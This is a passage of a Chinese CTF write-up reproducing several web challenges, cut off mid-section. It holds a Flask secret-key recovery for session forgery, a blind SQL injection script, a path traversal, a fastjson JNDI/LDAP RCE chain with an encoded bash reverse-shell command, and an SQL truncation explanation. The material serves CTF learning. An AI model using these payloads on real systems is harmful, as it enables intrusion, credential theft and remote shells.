<p><img src="https://img.npfs06.top/20210314220050.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>接下去读py文件，这里有个bug</p>
<p>由于是在buu复现，和原题不太一样，原题的main目录并不是这个，而我们去读取原题的main文件才是真正的<code>main.py</code><br>原题main.py <code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> username != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;aGN0Zg==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure>
<p>之前复现[CISCN2019 华东南赛区]Web4时做到过，接下去的做法也基本相同</p>
<p><strong>对全部的源码进行分析了，直接查找所需的SECRET_KEY的值发现：</strong></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">app.<span class="built_in">config</span>[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = str(<span class="built_in">random</span>.<span class="built_in">random</span>()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<p><strong>其对SECRET_KEY做了random随机处理，但random生成的随机数都是伪随机数，有一定的规律。</strong><br><strong>发现了其中：</strong></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">random</span>.seed(<span class="built_in">uuid</span>.getnode())</span><br></pre></td></tr></table></figure>
<p><strong>random.seed()方法改变随机数生成器的种子，Python之random.seed()用法</strong><br><strong>uuid.getnode()方法以48位正整数形式获取硬件地址，也就是服务器的MAC地址</strong></p>
<p><strong>若获取了服务器的MAC地址值，那么就可以构造出为伪随机的种子值，想到Linux中一切皆文件，查找到MAC地址存放在/sys/class/net/eth0/address文件中，读取该文件：得到其十六进制所表示的MAC地址</strong></p>
<blockquote>
<p>02:42:ac:10:9d:30</p>
</blockquote>
<p>然后脚本把它转换为10进制数，然后转换成SECRET_KEY</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">mac = &quot;02:42:ac:10:9d:30&quot;</span><br><span class="line"><span class="keyword">temp</span> = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="keyword">temp</span> = [<span class="type">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">temp</span>]</span><br><span class="line"><span class="keyword">temp</span> = [bin(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">temp</span>]</span><br><span class="line"><span class="keyword">temp</span> = <span class="string">&#x27;&#x27;</span>.<span class="keyword">join</span>(<span class="keyword">temp</span>)</span><br><span class="line">mac = <span class="type">int</span>(<span class="keyword">temp</span>,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = str(random.random()*<span class="number">100</span>)</span><br><span class="line">print(randStr)</span><br></pre></td></tr></table></figure>


<p>然后利用flask-session-cookie-manager进行伪造即可，然后将得到的伪session代替原session，即可得到flag</p>
<p><img src="https://img.npfs06.top/20210314223541.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="VNCTF-2021-realezjvav"><a href="#VNCTF-2021-realezjvav" class="headerlink" title="[VNCTF 2021]realezjvav"></a>[VNCTF 2021]realezjvav</h2><p>查看源码</p>
<p><img src="https://img.npfs06.top/20210317191712.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>再结合hint，很明显要sql注入</p>
<p>fuzz一下 发现过滤的并不多 但是延时函数sleep()等过滤了 并且貌似不能布尔盲注 搜了下 可以笛卡尔积盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://d1dce35d-de55-4046-a7a0-ca8e319394d7.node3.buuoj.cn//user/login&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># p1=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># p2=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid)</span></span><br><span class="line">        p1=<span class="string">&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        p2=<span class="string">&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        data1=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:p1&#125;</span><br><span class="line">        data2=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:p2&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.post(url,data=data1,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r2=requests.post(url,data=data2,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># user</span></span><br><span class="line"><span class="comment"># id,username,password</span></span><br><span class="line"><span class="comment"># no_0ne_kn0w_th1s</span></span><br></pre></td></tr></table></figure>


<p>登入之后是一个图像选择页面，测试了下发现图像接口存在目录穿越，读pom.xml</p>
<blockquote>
<p>../../../../../pom.xml</p>
</blockquote>
<p><img src="https://img.npfs06.top/20210317192251.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>刚好是有漏洞的版本 </p>
<p>参考连接：<a href="https://www.redhatzone.com/ask/article/2914.html">https://www.redhatzone.com/ask/article/2914.html</a></p>
<p>工具下载链接：<a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
<p>基本上照着参考链接做就能成功得到flag</p>
<p>我们要做的就是 <code>http -&gt; ldap -&gt; exploit.class -&gt;反弹shell</code></p>
<p><strong>第一步</strong></p>
<p>将下载的工具放在同一目录下</p>
<p><img src="https://img.npfs06.top/20210317193249.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以发现多了一个Exploit.calss文件，这是需要自己本地<code>javac Exploit.java</code>生成的</p>
<p>Exploit.java修改如下</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="title">Exploit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec( <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4eC54eHgueHh4Lnh4eC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);  <span class="comment">//这里就是一个反弹shell的命令，填的是服务器ip和监听端口</span></span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="function"><span class="title">main</span>(<span class="params"><span class="built_in">String</span>[] argv</span>)</span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修改后，生成Exploit.class</p>
<p><strong>第二步</strong></p>
<p>开启HTTP服务</p>
<p><img src="https://img.npfs06.top/20210317193832.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>注意：这里是要在利用文件所在目录下开启http服务</p>
<p>这一步的作用就是启动http服务器，提供下载远程要调用的类</p>
<p><img src="https://img.npfs06.top/20210317195120.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以成功访问</p>
<p><strong>第三步</strong></p>
<p>开启ldap服务</p>
<p>同理，在当前目录下运行LDAP服务,修改IP为当前这台服务器的IP</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-<span class="literal">all</span>.jar marshalsec.jndi.LDAPRefServer http://IP/#Exploit</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210317194047.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这里红框圈起来的地方需要注意一下，9999是自定义的ldap开启端口，不设置的话默认是1389，不过我在复现的时候发现，如果不指定端口的话，无法成功引用exploit文件</p>
<p><strong>第四步</strong></p>
<p>开启监听</p>
<p><img src="https://img.npfs06.top/20210317194321.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>第五步</strong></p>
<p>getshell</p>
<p>通过测试，发现正常的json语句被过滤，需要进行编码转换，前几天p神的知识星球刚好有讲到</p>
<p><img src="https://img.npfs06.top/20210317195940.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这里用unicode编码绕过</p>
<p><img src="https://img.npfs06.top/20210317194617.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">roleJson=&#123;&quot;name&quot;:&#123;&quot;<span class="symbol">\u</span>0040<span class="symbol">\u</span>0074<span class="symbol">\u</span>0079<span class="symbol">\u</span>0070<span class="symbol">\u</span>0065&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;<span class="symbol">\u</span>0063<span class="symbol">\u</span>006f<span class="symbol">\u</span>006d<span class="symbol">\u</span>002e<span class="symbol">\u</span>0073<span class="symbol">\u</span>0075<span class="symbol">\u</span>006e<span class="symbol">\u</span>002e<span class="symbol">\u</span>0072<span class="symbol">\u</span>006f<span class="symbol">\u</span>0077<span class="symbol">\u</span>0073<span class="symbol">\u</span>0065<span class="symbol">\u</span>0074<span class="symbol">\u</span>002e<span class="symbol">\u</span>004a<span class="symbol">\u</span>0064<span class="symbol">\u</span>0062<span class="symbol">\u</span>0063<span class="symbol">\u</span>0052<span class="symbol">\u</span>006f<span class="symbol">\u</span>0077<span class="symbol">\u</span>0053<span class="symbol">\u</span>0065<span class="symbol">\u</span>0074<span class="symbol">\u</span>0049<span class="symbol">\u</span>006d<span class="symbol">\u</span>0070<span class="symbol">\u</span>006c&quot;&#125;,&quot;x&quot;:&#123;&quot;<span class="symbol">\u</span>0040<span class="symbol">\u</span>0074<span class="symbol">\u</span>0079<span class="symbol">\u</span>0070<span class="symbol">\u</span>0065&quot;:&quot;<span class="symbol">\u</span>0063<span class="symbol">\u</span>006f<span class="symbol">\u</span>006d<span class="symbol">\u</span>002e<span class="symbol">\u</span>0073<span class="symbol">\u</span>0075<span class="symbol">\u</span>006e<span class="symbol">\u</span>002e<span class="symbol">\u</span>0072<span class="symbol">\u</span>006f<span class="symbol">\u</span>0077<span class="symbol">\u</span>0073<span class="symbol">\u</span>0065<span class="symbol">\u</span>0074<span class="symbol">\u</span>002e<span class="symbol">\u</span>004a<span class="symbol">\u</span>0064<span class="symbol">\u</span>0062<span class="symbol">\u</span>0063<span class="symbol">\u</span>0052<span class="symbol">\u</span>006f<span class="symbol">\u</span>0077<span class="symbol">\u</span>0053<span class="symbol">\u</span>0065<span class="symbol">\u</span>0074<span class="symbol">\u</span>0049<span class="symbol">\u</span>006d<span class="symbol">\u</span>0070<span class="symbol">\u</span>006c&quot;,&quot;dataSourceName&quot;:&quot;ldap://xxx.xxx.xxx.xxx:9999/Exploit&quot;,&quot;<span class="symbol">\u</span>0061<span class="symbol">\u</span>0075<span class="symbol">\u</span>0074<span class="symbol">\u</span>006f<span class="symbol">\u</span>0043<span class="symbol">\u</span>006f<span class="symbol">\u</span>006d<span class="symbol">\u</span>006d<span class="symbol">\u</span>0069<span class="symbol">\u</span>0074&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>


<p>成功监听，</p>
<p><img src="https://img.npfs06.top/20210317194640.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="FBCTF2019-Products-Manager"><a href="#FBCTF2019-Products-Manager" class="headerlink" title="[FBCTF2019]Products Manager"></a>[FBCTF2019]Products Manager</h2><p>知识点：sql约束攻击</p>
<p>通过测试发现可以通过<code>add</code>添加产品信息，通过<code>view</code>查看产品信息</p>
<p>审计代码</p>
<p><img src="https://img.npfs06.top/20210318230747.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>其中给出了提示，flag在<code>facebook</code>中，但若想查询产品细节，需要产品的<code>Secret</code>值</p>
<h3 id="数据库字符串比较"><a href="#数据库字符串比较" class="headerlink" title="数据库字符串比较"></a>数据库字符串比较</h3><p><strong>在处理SQL中的字符串时，字符串末尾的空格字符都会被删除。换句话说，“cat”与“cat      ”几乎是等效的，这在大多数情况下是正确的，例如WHERE子句中的字符串或INSERT语句中的字符串。例如，以下语句的查询结果，与使用用户名“cat”进行查询时的结果是一样的。</strong></p>
<p><img src="https://img.npfs06.top/20210318231001.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>但是，除此之外也确实存在例外情况，例如LIKE子句。注意，对尾部空白字符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</p>
<h3 id="INSERT截断"><a href="#INSERT截断" class="headerlink" title="INSERT截断"></a>INSERT截断</h3><p> <strong>在任意INSERT查询中，SQL会根据varchar(n)来限制字符串的最大长度，也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。例如，如果特定列的长度约束为“5”个字符，那么在插入字符串“facebook”时，实际上只能插入字符串的前5个字符，即“faceb”。</strong></p>
<p><img src="https://img.npfs06.top/20210318231504.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>查看view.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$name</span>) &amp;&amp; <span class="variable">$name</span> !== <span class="string">&quot;&quot;</span></span><br><span class="line">        &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$secret</span>) &amp;&amp; <span class="variable">$secret</span> !== <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (check_name_secret(<span class="variable">$name</span>, hash(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$secret</span>)) === <span class="literal">false</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Incorrect name or secret, please try again&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$product</span> = get_product(<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Product details:&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;ul&gt;&lt;li&gt;&quot;</span> . htmlentities(<span class="variable">$product</span>[<span class="string">&#x27;name&#x27;</span>]) . <span class="string">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&quot;</span> . htmlentities(<span class="variable">$product</span>[<span class="string">&#x27;description&#x27;</span>]) . <span class="string">&quot;&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>跟进到/db.php::check_name_secret，源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_name_secret</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">  <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;prepare(</span><br><span class="line">    <span class="string">&quot;SELECT name FROM products WHERE name = ? AND secret = ?&quot;</span></span><br><span class="line">  );</span><br><span class="line">  check_errors(<span class="variable">$statement</span>);</span><br><span class="line">  <span class="variable">$statement</span>-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, <span class="variable">$name</span>, <span class="variable">$secret</span>);</span><br><span class="line">  check_errors(<span class="variable">$statement</span>-&gt;execute());</span><br><span class="line">  <span class="variable">$res</span> = <span class="variable">$statement</span>-&gt;get_result();</span><br><span class="line">  check_errors(<span class="variable">$res</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$res</span>-&gt;fetch_assoc() !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$statement</span>-&gt;close();</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>   “SELECT name FROM products WHERE name = ? AND secret = ?”</p>
</blockquote>
<p>没有做什么过滤</p>
<p>/db.php::get_product源码如下：</p>
